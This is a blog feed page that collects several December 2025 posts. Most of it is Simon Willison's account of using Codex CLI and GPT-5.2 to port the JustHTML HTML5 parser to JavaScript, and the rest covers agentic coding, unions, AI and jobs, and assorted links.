<p>As every end is a new beginning <a href="https://modern-sql.com/">modern-sql.com</a> now covers <a href="https://duckdb.org/">DuckDB</a> instead. DuckDB is an in-process System that aims at analytic workloads on commodity hardware such as your laptop computer. DuckDB is often praised for its ease of use and its capability to use all CPU cores of the system it is running on. That is quite often enough scalability. In particular, when different uses have copies of the database locally on their computer. If that sounds reasonably to you, you might want to give <a href="https://duckdb.org/">DuckDB</a> a try.</p>
<p>Just because I can I’m also putting the chart about the <a href="https://modern-sql.com/caniuse/merge"><code>merge</code> statement</a> here (introduced with DuckDB 1.4, as you can see below).</p>

      <h1>I ported JustHTML from Python to JavaScript with Codex CLI and GPT-5.2 in 4.5 hours</h1>

(date: 2025-12-15)
      <p>
      <p>I <a href="https://simonwillison.net/2025/Dec/14/justhtml/">wrote about JustHTML yesterday</a> - Emil Stenström's project to build a new standards compliant HTML5 parser in pure Python code using coding agents running against the comprehensive html5lib-tests testing library. Last night, purely out of curiosity, I decided to try <strong>porting JustHTML from Python to JavaScript</strong> with the least amount of effort possible, using Codex CLI and GPT-5.2. It worked beyond my expectations.</p>
<h4>TL;DR</h4>
<p>I built <a href="https://github.com/simonw/justjshtml">simonw/justjshtml</a>, a dependency-free HTML5 parsing library in JavaScript which passes 9,200 tests from the html5lib-tests suite and imitates the API design of Emil's JustHTML library.</p>
<p>It took two initial prompts and a few tiny follow-ups. <a href="https://simonwillison.net/2025/Dec/11/gpt-52/">GPT-5.2</a> running in <a href="https://github.com/openai/codex">Codex CLI</a> ran uninterrupted for several hours, burned through 1,464,295 input tokens, 97,122,176 cached input tokens and 625,563 output tokens and ended up producing 9,000 lines of fully tested JavaScript across 43 commits.</p>
<p>Time elapsed from project idea to finished library: about 4 hours, during which I also bought and decorated a Christmas tree with family and watched the latest Knives Out movie.</p>
<h4>Some background</h4>
<p>One of the most important contributions of the HTML5 specification ten years ago was the way it precisely specified how <em>invalid</em> HTML should be parsed. The world is full of invalid documents and having a specification that covers those means browsers can treat them in the same way - there's no more &quot;undefined behavior&quot; to worry about when building parsing software.</p>
<p>Unsurprisingly, those invalid parsing rules are pretty complex! The free online book <a href="https://htmlparser.info/">Idiosyncrasies of the HTML parser</a> by Simon Pieters is an excellent deep dive into this topic, in particular <a href="https://htmlparser.info/parser/">Chapter 3. The HTML parser</a>.</p>
<p>The Python <a href="https://github.com/html5lib/html5lib-python">html5lib</a> project started the <a href="https://github.com/html5lib/html5lib-tests">html5lib-tests</a> repository with a set of implementation-independent tests. These have since become the gold standard for interoperability testing of HTML5 parsers, and are used by projects such as <a href="https://github.com/servo/servo">Servo</a> which used them to help build <a href="https://github.com/servo/html5ever">html5ever</a>, a &quot;high-performance browser-grade HTML5 parser&quot; written in Rust.</p>
<p>Emil Stenström's <a href="https://github.com/EmilStenstrom/justhtml">JustHTML</a> project is a pure-Python implementation of an HTML5 parser that passes the full html5lib-tests suite. Emil <a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/">spent a couple of months</a> working on this as a side project, deliberately picking a problem with a comprehensive existing test suite to see how far he could get with coding agents.</p>
<p>At one point he had the agents rewrite it based on a close inspection of the Rust html5ever library. I don't know how much of this was direct translation versus inspiration (here's Emil's <a href="https://news.ycombinator.com/item?id=46264195#46267059">commentary on that</a>) - his project has 1,215 commits total so it appears to have included a huge amount of iteration, not just a straight port.</p>
<p>My project <strong>is</strong> a straight port. I instructed Codex CLI to build a JavaScript version of Emil's Python code.</p>
<h4>The process in detail</h4>
<p>I started with a bit of mise en place. I checked out two repos and created an empty third directory for the new project:</p>
<pre><code>cd ~/dev
git clone https://github.com/EmilStenstrom/justhtml
git clone https://github.com/html5lib/html5lib-tests
mkdir justjshtml
cd justjshtml
</code></pre>
<p>Then I started Codex CLI for GPT-5.2 like this:</p>
<pre><code>codex --yolo -m gpt-5.2
</code></pre>
<p>That <code>--yolo</code> flag is a shortcut for <code>--dangerously-bypass-approvals-and-sandbox</code>, which is every bit as dangerous as it sounds.</p>
<p>My first prompt told Codex to inspect the existing code and use it to build a specification for the new JavaScript library:</p>
<blockquote>
<p><code>We are going to create a JavaScript port of ~/dev/justhtml - an HTML parsing library that passes the full ~/dev/html5lib-tests test suite. It is going to have a similar API to the Python library but in JavaScript. It will have no dependencies other than raw JavaScript, hence it will work great in the browser and node.js and other environments. Start by reading ~/dev/justhtml and designing the user-facing API for the new library - create a spec.md containing your plan.</code></p>
</blockquote>
<p>I reviewed the spec, which included a set of proposed milestones, and told it to add another:</p>
<blockquote>
<p><code>Add an early step to the roadmap that involves an initial version that parses a simple example document that is valid and returns the right results. Then add and commit the spec.md file.</code></p>
</blockquote>
<p>Here's <a href="https://github.com/simonw/justjshtml/blob/19b8eb1f2ca80f428a3c40862d5ec05d36e5166b/spec.md">the resulting spec.md file</a>. My request for that initial version became &quot;Milestone 0.5&quot; which looked like this:</p>
<blockquote>
<p><strong>Milestone 0.5 — End-to-end smoke parse (single valid document)</strong></p>
<ul>
<li>Implement the smallest end-to-end slice so the public API is real early:
<ul>
<li><code>new JustHTML(&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)</code> returns a tree with the expected tag structure and text nodes.</li>
<li><code>doc.toText()</code> returns <code>&quot;Hello&quot;</code> and <code>doc.errors</code> is empty for this valid input.</li>
</ul>
</li>
<li>Add <code>scripts/smoke.js</code> (no deps) that runs the example and asserts the expected structure/output.</li>
<li>Gate: <code>node scripts/smoke.js</code> passes.</li>
</ul>
</blockquote>
<p>Then I told it:</p>
<blockquote>
<p><code>Implement Milestone 0.5</code></p>
</blockquote>
<p>And off it went. The resulting code appeared to work so I said:</p>
<blockquote>
<p><code>Configure GitHub Actions test.yml to run that on every commit, then commit and push</code></p>
</blockquote>
<p>I ran <code>git init</code> and created a private GitHub repository for this project at this point, and set up the local directory to push to that remote.</p>
<p>Here's <a href="https://github.com/simonw/justjshtml/commit/48497cbd05584c88af757a0736a2ee447468b6b3">that initial push</a>. Then I told it:</p>
<blockquote>
<p><code>OK do the rest, commit and push often</code></p>
</blockquote>
<p>And that was almost it!</p>
<p>I set my laptop to not fall asleep and left it to its devices while we went off to buy a Christmas tree. The &quot;commit and push often&quot; meant I could monitor its progress on my phone by refreshing <a href="https://github.com/simonw/justjshtml/commits/main">the commit log on GitHub</a>.</p>
<p>I was running this against my $20/month ChatGPT Plus account, which has a five hour token allowance window for Codex CLI. That ran out at 6:35pm and Codex paused, so I waited until the reset point at 7:14pm and typed:</p>
<blockquote>
<p><code>Keep going</code></p>
</blockquote>
<p>At 9:30pm it declared itself done with the following summary message:</p>
<pre><code>• What’s Done

  - html5lib-tests now run in CI and pass: tokenizer 6810/6810, tree 1770/1782
    (12 skipped: #script-on), serializer 230/230, encoding 82/83 (1 skipped:
    scripted) (.github/workflows/test.yml:1).
  - Public API expanded: stream() (src/stream.js:1), CSS selectors query()/
    matches() (src/selector.js:1), and toMarkdown() (src/markdown.js:1), all
    exported via src/index.js:1.
  - Added no-deps unit scripts for selectors/stream/markdown (scripts/run-
    selector-tests.js:1, scripts/run-stream-tests.js:1, scripts/run-markdown-
    tests.js:1) and wired them into CI.
  - Fixed TreeBuilder so &lt;br&gt; no longer closes &lt;p&gt; (src/treebuilder.js:647).

</code></pre>
<p>As a finishing touch, I had it add a playground interface so I could try out the new library in my browser. I prompted:</p>
<blockquote>
<p><code>Add a playground.html in the top level folder which loads the necessary ES modules from ./src/... and implements the exact same functionality as seen on https://tools.simonwillison.net/justhtml but using the JavaScript library instead of Pyodide</code></p>
</blockquote>
<p>It fetched my <a href="https://tools.simonwillison.net/justhtml">existing JustHTML playground page</a> ( <a href="https://simonwillison.net/2025/Dec/14/justhtml/#first-impressions-of-justhtml">described here</a>) using <code>curl</code> and built a new <code>playground.html</code> file that loaded the new JavaScript code instead. This worked <em>perfectly</em>.</p>
<p>I enabled GitHub Pages for my still-private repo which meant I could access the new playground at this URL:</p>
<p><a href="https://simonw.github.io/justjshtml/playground.html">https://simonw.github.io/justjshtml/playground.html</a></p>
<p><img src="https://static.simonwillison.net/static/2025/justjshtml-playground.jpg" alt="Screenshot of JustJSHTML Playground web application. Header reads &quot;JustJSHTML Playground&quot; with subtitle &quot;A dependency-free JavaScript HTML5 parser - GitHub&quot;. Below is a status bar showing &quot;JavaScript Environment&quot; with a green &quot;Ready&quot; badge. The main input area has &quot;Paste HTML&quot; and &quot;Fetch from URL&quot; buttons, with a text area containing HTML code: &quot;   Example Page     &quot;. A &quot;Playground Mode&quot; section shows buttons for &quot;CSS Selector Query&quot;, &quot;Pretty Print HTML&quot;, &quot;Tree Structure&quot;, &quot;Stream Events&quot;, &quot;Extract Text&quot;, and &quot;To Markdown&quot; (highlighted in purple). Below is a text field labeled &quot;CSS Selector (optional - leave empty for whole document):&quot; with placeholder &quot;e.g., article, main, .content (or leave empty)&quot; and a green &quot;Convert to Markdown&quot; button. The Output section has a teal header with &quot;Whole document&quot; badge and displays converted markdown: &quot;Example Page&quot; followed by &quot;- Home&quot; &quot;- About&quot; &quot;- Contact&quot;."></p>
<p>All it needed now was some documentation:</p>
<blockquote>
<p><code>Add a comprehensive README with full usage instructions including attribution plus how this was built plus how to use in in HTML plus how to use it in Node.js</code></p>
</blockquote>
<p>You can <a href="https://github.com/simonw/justjshtml/blob/f3a33fdb29bf97846fd017185edc8cf82783032e/README.md">read the result here</a>.</p>
<p>We are now at eight prompts total, running for just over four hours and I've decorated for Christmas and watched <a href="https://en.wikipedia.org/wiki/Wake_Up_Dead_Man">Wake Up Dead Man</a> on Netflix.</p>
<p>According to Codex CLI:</p>
<blockquote>
<p><code>Token usage: total=2,089,858 input=1,464,295 (+ 97,122,176 cached) output=625,563 (reasoning 437,010)</code></p>
</blockquote>
<p>My <a href="https://www.llm-prices.com/#it=2089858&amp;cit=97122176&amp;ot=625563&amp;sel=gpt-5.2">llm-prices.com calculator</a> estimates that at <span class="math inline">\(29.41 if I was paying for those tokens at API prices, but they were included in my \)</span>20/month ChatGPT Plus subscription so the actual extra cost to me was zero.</p>
<h4>What can we learn from this?</h4>
<p>I'm sharing this project because I think it demonstrates a bunch of interesting things about the state of LLMs in December 2025.</p>
<ul>
<li>Frontier LLMs really can perform complex, multi-hour tasks with hundreds of tool calls and minimal supervision. I used GPT-5.2 for this but I have no reason to believe that Claude Opus 4.5 or Gemini 3 Pro would not be able to achieve the same thing - the only reason I haven't tried is that I don't want to burn another 4 hours of time and several million tokens on more runs.</li>
<li>If you can reduce a problem to a robust test suite you can set a coding agent loop loose on it with a high degree of confidence that it will eventually succeed. I called this <a href="https://simonwillison.net/2025/Sep/30/designing-agentic-loops/">designing the agentic loop</a> a few months ago. I think it's the key skill to unlocking the potential of LLMs for complex tasks.</li>
<li>Porting entire open source libraries from one language to another via a coding agent works extremely well.</li>
<li>Code is so cheap it's practically free. Code that <em>works</em> continues to carry a cost, but that cost has plummeted now that coding agents can check their work as they go.</li>
<li>We haven't even <em>begun</em> to unpack the etiquette and ethics around this style of development. Is it responsible and appropriate to churn out a direct port of a library like this in a few hours while watching a movie? What would it take for code built like this to be trusted in production?</li>
</ul>
<p>I'll end with some open questions:</p>
<ul>
<li>Does this library represent a legal violation of copyright of either the Rust library or the Python one?</li>
<li>Even if this is legal, is it ethical to build a library in this way?</li>
<li>Does this format of development hurt the open source ecosystem?</li>
<li>Can I even assert copyright over this, given how much of the work was produced by the LLM?</li>
<li>Is it responsible to publish software libraries built in this way?</li>
<li>How much better would this library be if an expert team hand crafted it over the course of several months?</li>
</ul>

      <p><img src="https://imgs.scripting.com/2025/12/15/reiner.png" alt="">For some reason, I'm hit especially hard by the death of <a href="https://en.wikipedia.org/wiki/Rob_Reiner">Rob Reiner</a>. And it's coming at a time when I understand a lot more about how movie directors work, having watched the fantastic <a href="https://www.metacritic.com/tv/mr-scorsese/">Mr Scorsese</a> 5-part <a href="https://en.wikipedia.org/wiki/Mr._Scorsese">documentary</a> <a href="https://www.metacritic.com/tv/mr-scorsese/">series</a> on Apple TV. The movie director can be as involved in the story as much as the writers or actors. There was a story about Reiner, I heard today in eulogy: he was dating his future wife at the same time he was directing the fantastic <a href="https://www.metacritic.com/movie/when-harry-met-sally/">When Harry Met Sally</a>. He changed the ending because he was in love, and thus created the most heart-pulling <a href="https://www.youtube.com/watch?v=Q9JSVGS4dHU">end to a story</a>, when the two friends realize they should be together, and Billy Crystal's character gives the great closing speech that contains this line, that pretty well sums up the urgency of love: &quot;When you realize you want to spend the rest of your life with somebody, you want the rest of your life to start as soon as possible.&quot; The Scorsese doc opens up the art of making movies for me in the same way the <a href="https://en.wikipedia.org/wiki/Peter_Jackson">Peter Jackson</a> <a href="https://en.wikipedia.org/wiki/The_Beatles:_Get_Back">documentary</a> on the <a href="http://scripting.com/2022/01/25/144824.html?title=imABeatleshead">Beatles</a> showed us how super creative music creators do their work. And the timing is great, because it says so much about Reiner's accomplishments and gifts.</p>

(date: 2025-12-15)
      <p>
      <p>Daveverse has become a serious site, and I'm more reluctant to use it for a test post than I ever have been, but here I am once again doing a test post. I have high hopes for this test. And my sleeves are rolled up, I'm reasonably caffeinated, and ready to rock. Or roll.</p>
<p>Maybe I'll write some stuff here that I will later post to Scripting News, when it will come right back here to daveverse. As they say -- Oh the humanity.</p>
<p>BTW the trailer for Animal Farm was realllly offensive, as if it were a cautionary tale. It looks like a kids show, but it's not, but people will still have their kids watch it, they won't know and &quot;A cautionary tale&quot; kind of says the problem out loud. It's bullshit because we're living Animal Farm right now. So if you want your kid to be aware of reality, the <em>cautionary tale</em> part is a problem.</p>
<p>BTW when I first wrote this, I wrote Animal House not Animal Farm. Very different movies.</p>
<p>Also the Scorcese special is full of information about how movies work, but barely skims the surface. Watching it was like watching the Peter Jackson Beatles story. All of a sudden I get a glimpse of how they do it, how people work with each other. Scorcese formed a kind of Beatles of his own. And there are a lot of his movies I haven't seen.</p>
<p>NakedJen if you read this -- can we find a way to get four great Scorcese movies I haven't seen into the rotation? And btw, when I typed NJ's name in just now, I wrote NakeDen. Too much ChatGPT I expect.</p>
<p>WordLand bug report: if you don't specify a site, when you publish it goes to the last site you posted to which is likely links.daveverse.org.</p>

      <h1>Pluralistic: Break up bad companies; replace bad union bosses (15 Dec 2025)</h1>

(date: 2025-12-15)
      <p>
      <p>Today's links Break up bad companies; replace bad union bosses: Labor should be fixed, capital should be vanquished. Hey look at this: Delights to delectate. Object permanence: &quot;Star Island&quot;; &quot;Mediactive&quot;; Afraid of solar; Well-Armed Peasants; Dumpster fire exits; Wikipedia v Brittanica; Pentagon v Quakers; Stealing whole houses; &quot;Situation Normal.&quot; Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Break up bad companies; replace bad union bosses (permalink) Unions are not perfect. Indeed, it is possible to belong to a union that is bad for workers: either because it is weak, or corrupt, or captured (or some combination of the three). Take the &quot;two-tier contract.&quot; As unions lost ground – thanks to changes in labor law enforcement under a succession of both Republican and Democratic administrations – labor bosses hit on a suicidal strategy for contract negotiations. Rather than bargaining for a single contract that covered all the union's dues-paying members, these bosses negotiated contracts that guaranteed benefits for existing members, but did not extend these benefits to new members: <a href="https://pluralistic.net/2021/11/25/strikesgiving/#shed-a-tier">https://pluralistic.net/2021/11/25/strikesgiving/#shed-a-tier</a> A two-tier contract is one where all workers pay dues, but only the dwindling rump of older, more established workers get any protection or representation from their union. An ever-larger portion of the membership have to pay dues, but get nothing for them. You couldn't come up with a better way to destroy unions if you tried. Thankfully, union workers figured out that the answer to this problem was firing their leaders and replacing them with militant, principled leaders who cared about workers, not just a subsection of their members. Radicals in big unions – like the UAW – teamed up with comrades from university grad students' unions to master the arcane rules that had been weaponized by corrupt bosses to prevent free and fair union elections. Together, they forced the first legitimate union elections in generations, and then the newly elected leaders ran historic strikes that won huge gains for workers (and killed off the two-tier contract): <a href="https://theintercept.com/2023/04/07/deconstructed-union-dhl-teamsters-uaw/">https://theintercept.com/2023/04/07/deconstructed-union-dhl-teamsters-uaw/</a> Corrupt unions aren't the only life-destroying institutions that radicals have set their sights on this decade. Concentrated corporate power is the most dangerous force in the world today (indeed, it's large, powerful corporations that corrupted those unions). Antitrust activists, environmental activists, consumer rights activists, privacy activists and labor activists have stepped up the global war on big business all through this decade. From new antitrust laws to antitrust lawsuits to strikes to boycotts to mass protests and direct action, this decade has marked a turning point in the global consciousness about the danger of corporate power and the need to fight it. But there's a big, important difference between bad corporations and bad unions: what we should do about them. The answer to a powerful, corrupt corporation is to take action that strips it of its power: break the company up, whack it with fines, take away its corporate charter, strip its executives of their fortunes, even put them in prison. That's because corporations are foundationally undemocratic institutions, governed by &quot;one share, one vote&quot; (and the billionaires who benefit from corporate power are building a society that's &quot;one dollar, one vote&quot;). They fundamentally exist to consolidate power at the expense of workers, suppliers and customers, to extract wealth by imposing costs on the rest of us, from pollution to political corruption. When a corporation gets big enough to pose a risk to societal wellbeing, we need to smash that corporation, not reform it. But the answer to a corrupt union is to fire the union bosses and replace them with better ones. The mission of a union is foundationally pro-democratic. A unionized workplace is a democratic workplace. As in any democracy, workplace democracies can be led by bad or incompetent people. But, as with any democracy, the way you fix this is by swapping out the bad leaders for good ones – not by abolishing democracy and replacing it with an atomized society in which it's every worker for themself, bargaining with a boss who will always win a one-on-one fight in the long run. I raise this because a general strike is back on the table, likely for May Day 2028 (5/1/28): <a href="https://labornotes.org/2025/12/maybe-general-strike-isnt-so-impossible-now">https://labornotes.org/2025/12/maybe-general-strike-isnt-so-impossible-now</a> Unions are an important check against fascism. That's why fascists always start by attacking organized labor: solidarity is the opposite of fascism. To have unions that are fit for purpose in this existential battle for the future of the nation – and, quite possibly, the human race – we desperately need better leaders. Like the union bosses who gave us the two-tier contract, many of our union leaders see their mission as narrowly serving their existing members, and not other workers – not even workers who might some day become their members. To get a sense of how bad it's gotten, consider these five facts: I. Public support for unions is at its highest level since the Carter administration; II. More workers want to join unions than at any time in living memory; III. Unions have larger cash reserves than at any time in history; IV. Under Biden, the National Labor Relations Board was more friendly to unions than at any time in generations; and V. During the Biden years, the number of unionized workers in America went down, not up. That's because union bosses – sitting on a mountain of cash, surrounded by workers begging to be organized – decided that their priority was their existing members, and declined to spend more than a pittance of their cash reserves on organizing efforts. This is suicidal – as self-destructive as the two-tier contract was. To pull off a general strike, we will need mass civil disobedience, and a willingness to ignore the Taft-Hartley Act's ban on solidarity strikes. Trump's NLRB isn't just hostile to workers – he's illegally fired so many of its commissioners that they can't even perform most of their functions. But a militant labor movement could turn that to its advantage, because militants know that when Trump fires the refs, you don't have to stop the game – you can throw out the rule book: <a href="https://pluralistic.net/2025/01/29/which-side-are-you-on-2/#strike-three-yer-out">https://pluralistic.net/2025/01/29/which-side-are-you-on-2/#strike-three-yer-out</a> This is the historic opportunity and challenge before us – to occupy our unions, save our workplace democracies, and then save our national democracy itself.

      <p>The Model Context Protocol (MCP) is genuinely useful. It gives people who develop AI tools a standardized way to call functions and access data from external systems. Instead of building custom integrations for each data source, you can expose databases, APIs, and internal tools through a common protocol that any AI can understand. However, I’ve […]</p>

      <p>Cast your mind back to May of this year: Congress was in the throes of debate over the massive <a href="https://www.congress.gov/bill/119th-congress/house-bill/1">budget bill</a>. Amidst the many seismic provisions, Senator Ted Cruz <a href="https://iapp.org/news/a/policy-analysis-us-house-committee-seeks-moratorium-on-state-AI-rules">dropped</a> a ticking time bomb of tech policy: a ten-year moratorium on the ability of states to regulate artificial intelligence. To many, this was catastrophic. The few massive AI companies seem to be swallowing our economy whole: their energy demands are overriding household needs, their data demands are overriding creators’ copyright, and their products are triggering mass unemployment as well as new types of clinical ...</p>

      <h1>It’s Uncomfortable To Sit With “I Don’t Know”</h1>

(date: 2025-12-14)
      <p>
      <p><a href="https://chriscoyier.net/2025/12/04/the-jeopardy-phenomenon/">Chris Coyier</a>:</p>
<blockquote>
<p>There’s the thing where if you’re reading an article in the newspaper, and it’s about stuff you don’t know a ton about, it all seems well and good. Then you read another article in the same paper and it’s about something you know intimately (your job, your neighborhood, your hobby, etc) there is a good chance you’ll be like hey! that’s not quite right!</p>
</blockquote>
<p>Chris extends this idea to AI-generated code, i.e. if you don’t know or understand the generated code you probably think, “Looks good to me!” But if you do know it you probably think, “Wait a second, that’s not quite right.”</p>
<p><a href="https://adactio.com/links/22289">Here’s Jeremy Keith riffing on Chris’ thoughts</a>:</p>
<blockquote>
<p>I’m astounded by the cognitive dissonance displayed by people who say “I asked an LLM about {topic I’m familiar with}, and here’s all the things it got wrong” who then proceed to say “It was really useful when I asked an LLM for advice on {topic I’m not familiar with, hence why I’m asking an LLM for advice}.”</p>
</blockquote>
<p>Kind of feels like this boils down to: How do we know what we know?</p>
<p>To be fair, that’s a question I’ve wrestled with my whole life.</p>
<p>And the older I get, the more and more I realize how often we barely know anything.</p>
<p>There’s a veneer of surety everywhere in the world.</p>
<p>There are industries of people and services who will take your money in exchange for a sense of surety — influencers, consultants, grifters, AI, they all exist because we are more than willing to pay with our time, attention, and money to feel like we “know” something.</p>
<p>“You’re absolutely right!”</p>
<p>But I, for one, often feel increasingly unsure of everything I thought I knew.</p>
<p>For example: I can’t count the number of times I thought I understood a piece of history, only to later find out that the commonly-accepted belief comes to use from a single source, written decades later in a diary or on a piece of parchment or on a stone, by someone with blind spots, questionable incentives, or a flair for the dramatic, all of which leaves me seriously questioning the veracity and objectivity of something I thought I knew.</p>
<p>Which leads me to the next, uncomfortable question: How many other things are there that <em>I thought</em> I knew but are full of uncertainty just like this?</p>
<p>All surety vanishes.</p>
<p>And that’s an uncomfortable place to be. Who wants to admit “I don’t know”?</p>
<p>It’s so easy to take what’s convenient over what corresponds to reality.</p>
<p>And that’s what scares me about AI.</p>

      <h1>JustHTML is a fascinating example of vibe engineering in action</h1>

(date: 2025-12-14)
      <p>
      <p>I recently came across <a href="https://github.com/EmilStenstrom/justhtml">JustHTML</a>, a new Python library for parsing HTML released by Emil Stenström. It's a very interesting piece of software, both as a useful library and as a case study in sophisticated AI-assisted programming.</p>
<h4>First impressions of JustHTML</h4>
<p>I didn't initially know that JustHTML had been written with AI assistance at all. The README caught my eye due to some attractive characteristics:</p>
<ul>
<li>It's pure Python. I like libraries that are pure Python (no C extensions or similar) because it makes them easy to use in less conventional Python environments, including Pyodide.</li>
<li>&quot;Passes all 9,200+ tests in the official <a href="https://github.com/html5lib/html5lib-tests">html5lib-tests</a> suite (used by browser vendors)&quot; - this instantly caught my attention! HTML5 is a big, complicated but meticulously written specification.</li>
<li>100% test coverage. That's not something you see every day.</li>
<li>CSS selector queries as a feature. I built a Python library for this <a href="https://github.com/simonw/soupselect">many years ago</a> and I'm always interested in seeing new implementations of that pattern.</li>
<li>html5lib has been <a href="https://github.com/mozilla/bleach/issues/698">inconsistently maintained</a> over the last few years, leaving me interested in potential alternatives.</li>
<li>It's only 3,000 lines of implementation code (and another ~11,000 of tests.)</li>
</ul>
<p>I was out and about without a laptop so I decided to put JustHTML through its paces on my phone. I <a href="https://github.com/simonw/tools/pull/156#issue-3726212220">prompted Claude Code for web</a> on my phone and had it build <a href="https://tools.simonwillison.net/justhtml">this Pyodide-powered HTML tool</a> for trying it out:</p>
<p><img src="https://static.simonwillison.net/static/2025/justhtml.jpeg" alt="Screenshot of a web app interface titled &quot;Playground Mode&quot; with buttons labeled &quot;CSS Selector Query&quot; (purple, selected), &quot;Pretty Print HTML&quot;, &quot;Tree Structure&quot;, &quot;Stream Events&quot;, &quot;Extract Text&quot;, and &quot;To Markdown&quot; (all gray). Below is a text field labeled &quot;CSS Selector:&quot; containing &quot;p&quot; and a green &quot;Run Query&quot; button. An &quot;Output&quot; section with dark background shows 3 matches in a green badge and displays HTML code"></p>
<p>This was enough for me to convince myself that the core functionality worked as advertised. It's a neat piece of code!</p>
<h4>Turns out it was almost all built by LLMs</h4>
<p>At this point I went looking for some more background information on the library and found Emil's blog entry about it: <a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/">How I wrote JustHTML using coding agents</a>:</p>
<blockquote>
<p>Writing a full HTML5 parser is not a short one-shot problem. I have been working on this project for a couple of months on off-hours.</p>
<p>Tooling: I used plain VS Code with Github Copilot in Agent mode. I enabled automatic approval of all commands, and then added a blacklist of commands that I always wanted to approve manually. I wrote an <a href="https://github.com/EmilStenstrom/justhtml/blob/main/.github/copilot-instructions.md">agent instruction</a> that told it to keep working, and don't stop to ask questions. Worked well!</p>
</blockquote>
<p>Emil used several different models - an advantage of working in VS Code Agent mode rather than a provider-locked coding agent like Claude Code or Codex CLI. Claude Sonnet 3.7, Gemini 3 Pro and Claude Opus all get a mention.</p>
<h4>Vibe engineering, not vibe coding</h4>
<p>What's most interesting about Emil's 17 step account covering those several months of work is how much software engineering was involved, independent of typing out the actual code.</p>
<p>I wrote about <a href="https://simonwillison.net/2025/Oct/7/vibe-engineering/">vibe engineering</a> a while ago as an alternative to vibe coding.</p>
<p>Vibe coding is when you have an LLM knock out code without any semblance of code review - great for prototypes and toy projects, definitely not an approach to use for serious libraries or production code.</p>
<p>I proposed &quot;vibe engineering&quot; as the grown up version of vibe coding, where expert programmers use coding agents in a professional and responsible way to produce high quality, reliable results.</p>
<p>You should absolutely read <a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/#the-journey">Emil's account</a> in full. A few highlights:</p>
<ol>
<li>He hooked in the 9,200 test <a href="https://github.com/html5lib/html5lib-tests">html5lib-tests</a> conformance suite almost from the start. There's no better way to construct a new HTML5 parser than using the test suite that the browsers themselves use.</li>
<li>He picked the core API design himself - a TagHandler base class with handle_start() etc. methods - and told the model to implement that.</li>
<li>He added a comparative benchmark to track performance compared to existing libraries like html5lib, then experimented with a Rust optimization based on those initial numbers.</li>
<li>He threw the original code away and started from scratch as a rough port of Servo's excellent <a href="https://github.com/servo/html5ever">html5ever</a> Rust library.</li>
<li>He built a custom profiler and new benchmark and let Gemini 3 Pro loose on it, finally achieving micro-optimizations to beat the existing Pure Python libraries.</li>
<li>He used coverage to identify and remove unnecessary code.</li>
<li>He had his agent build a <a href="https://github.com/EmilStenstrom/justhtml/blob/main/benchmarks/fuzz.py">custom fuzzer</a> to generate vast numbers of invalid HTML documents and harden the parser against them.</li>
</ol>
<p>This represents a lot of sophisticated development practices, tapping into Emil's deep experience as a software engineer. As described, this feels to me more like a lead architect role than a hands-on coder.</p>
<p>It perfectly fits what I was thinking about when I described <strong>vibe engineering</strong>.</p>
<p>Setting the coding agent up with the html5lib-tests suite is also a great example of <a href="https://simonwillison.net/2025/Sep/30/designing-agentic-loops/">designing an agentic loop</a>.</p>
<h4>&quot;The agent did the typing&quot;</h4>
<p>Emil concluded his article like this:</p>
<blockquote>
<p>JustHTML is about 3,000 lines of Python with 8,500+ tests passing. I couldn't have written it this quickly without the agent.</p>
<p>But &quot;quickly&quot; doesn't mean &quot;without thinking.&quot; I spent a lot of time reviewing code, making design decisions, and steering the agent in the right direction. The agent did the typing; I did the thinking.</p>
<p>That's probably the right division of labor.</p>
</blockquote>
<p>I couldn't agree more. Coding agents replace the part of my job that involves typing the code into a computer. I find what's left to be a much more valuable use of my time.</p>

      <p>It's not just me that says that our <a href="https://daytona.scripting.com/search?q=%22social%20web%22">social web</a> is connected by <a href="https://cyber.harvard.edu/rss/rss.html">RSS</a>.</p>

<p>If they all did it, we'd have all the freedom we could ever want.</p>
<p>So what's holding it up?</p>
<p>Let's make a resolution for 2026, that we the people, will demand that the social networking software we use get in tune with the web, and support two-way RSS.</p>

      <h1>Copywriters reveal how AI has decimated their industry</h1>

(date: 2025-12-14)
      <p>
      <p><strong><a href="https://www.bloodinthemachine.com/p/i-was-forced-to-use-ai-until-the">Copywriters reveal how AI has decimated their industry</a></strong></p>
<p>Brian Merchant has been collecting personal stories for his series <a href="https://www.bloodinthemachine.com/s/ai-killed-my-job">AI Killed My Job</a> - previously covering <a href="https://www.bloodinthemachine.com/p/how-ai-is-killing-jobs-in-the-tech-f39">tech workers</a>, <a href="https://www.bloodinthemachine.com/p/ai-killed-my-job-translators">translators</a>, and <a href="https://www.bloodinthemachine.com/p/artists-are-losing-work-wages-and">artists</a> - and this latest piece includes anecdotes from 12 professional copywriters all of whom have had their careers devastated by the rise of AI-generated copywriting tools.</p>
<p>It's a tough read. Freelance copywriting does not look like a great place to be right now.</p>
<blockquote>
<p>AI is really dehumanizing, and I am still working through issues of self-worth as a result of this experience. When you go from knowing you are valuable and valued, with all the hope in the world of a full career and the ability to provide other people with jobs... To being relegated to someone who edits AI drafts of copy at a steep discount because “most of the work is already done” ...</p>
</blockquote>
<p>The big question for me is if a new AI-infested economy creates new jobs that are a great fit for people affected by this. I would hope that clear written communication skills are made even more valuable, but the people interviewed here don't appear to be finding that to be the case.</p>

      <p>These are some things I’ve wandered across on the web this week.</p>
<h2>🔖 <a href="https://github.com/elder-plinius/CL4R1T4S/">CL4R1T4S</a></h2>

<h2>🔖 <a href="https://ai.harvardartmuseums.org/">AIExplorer: Explore how a computer sees art</a></h2>
<p>Harnessing artificial intelligence, the Harvard Art Museums have
gathered 71,035,440 machine-generated descriptions and tags for 387,885
images from across their collections. Using techniques such as object
recognition and face analysis—which estimates gender, age, and
emotion—this data offers insights into how computers perceive and
interpret a wide range of artworks and objects.</p>
<h2>🔖 <a href="https://arstechnica.com/gadgets/2025/12/after-nearly-30-years-crucial-will-stop-selling-ram-to-consumers/">After nearly 30 years, Crucial will stop selling RAM to consumers</a></h2>
<p>On Wednesday, Micron Technology announced it will exit the consumer RAM
business in 2026, ending 29 years of selling RAM and SSDs to PC builders
and enthusiasts under the Crucial brand. The company cited heavy demand
from AI data centers as the reason for abandoning its consumer brand, a
